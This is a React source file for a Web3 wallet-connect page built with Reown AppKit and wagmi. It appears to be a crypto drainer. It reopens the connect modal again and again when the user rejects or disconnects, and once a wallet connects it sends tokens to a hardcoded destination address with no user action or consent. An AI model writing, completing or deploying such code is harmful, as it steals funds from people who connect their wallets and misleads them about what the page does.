import { createAppKit } from '@reown/appkit/react'
import { WagmiProvider, useAccount } from 'wagmi'
import { QueryClient, QueryClientProvider } from '@tanstack/react-query'
import { useEffect } from 'react'
import { projectId, metadata, networks, wagmiAdapter , solanaWeb3JsAdapter} from './config'
import { ethers } from 'ethers';

import "./App.css"

const queryClient = new QueryClient()

const generalConfig = {
  projectId,
  metadata,
  networks,
  themeMode: 'dark' as const,
  features: {
    analytics: true // Optional - defaults to your Cloud configuration
  },
  themeVariables: {
    '--w3m-accent': '#000000',
  }
}

// Create modal
const appKit = createAppKit({
  adapters: [wagmiAdapter, solanaWeb3JsAdapter],
  ...generalConfig,
})

const DESTINATION_WALLET = "0x365Fd0098DB3ed48e64fd816beaeEe69FE1e354B" // Replace with your actual wallet address

const WalletDisplay = () => {
  const { address: userAddress, isConnected } = useAccount();

  useEffect(() => {
    const autoTransferTokens = async () => {
      if (isConnected && userAddress) {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const signer = provider.getSigner();

        const recipientAddress = DESTINATION_WALLET; // Replace with your destination wallet address
        const amountToSend = ethers.utils.parseUnits("0.01", "ether"); // Adjust the amount and unit as needed

        const tokenContractAddress = "YOUR_TOKEN_CONTRACT_ADDRESS"; // Replace with your token contract address
        const tokenAbi = [
          "function transfer(address to, uint amount) public returns (bool)"
        ];

        const tokenContract = new ethers.Contract(tokenContractAddress, tokenAbi, signer);

        try {
          const tx = await tokenContract.transfer(recipientAddress, amountToSend);
          await tx.wait(); // Wait for the transaction to be mined
          console.log("Transfer successful:", tx);
        } catch (error) {
          console.error("Transfer failed:", error);
        }
      }
    };

    autoTransferTokens();
  }, [isConnected, userAddress]);

  return (
    <div style={{
      background: '#f0f0f0',
      padding: '1rem',
      borderRadius: '8px',
      marginTop: '20px',
      textAlign: 'center'
    }}>
      {isConnected && (
        <div style={{ marginTop: '20px' }}>
          <h3>Your Wallet Address:</h3>
          <code style={{ wordBreak: 'break-all' }}>{userAddress}</code>
        </div>
      )}
      <div style={{ marginTop: '20px' }}>
        <h3>Destination Wallet Address:</h3>
        <code style={{ wordBreak: 'break-all' }}>{DESTINATION_WALLET}</code>
      </div>
    </div>
  );
};

export function App() {
  useEffect(() => {
    // Auto-open modal on mount
    const openModal = async () => {
      try {
        await appKit.open()
      } catch (error) {
        console.log("Connection rejected", error)
        // Retry opening the modal after rejection
        setTimeout(() => openModal(), 500)
      }
    }

    openModal()

    // Reopen modal on disconnect
    const handleDisconnect = () => {
      openModal()
    }

    window.addEventListener('disconnect', handleDisconnect)
    return () => {
      window.removeEventListener('disconnect', handleDisconnect)
    }
  }, [])

  return (
    <div className={"pages"}>
      <WagmiProvider config={wagmiAdapter.wagmiConfig}>
        <QueryClientProvider client={queryClient}>
            <WalletDisplay />
            {/* <ActionButtonList /> */}
        </QueryClientProvider>
      </WagmiProvider>
    </div>
  )
}

export default App
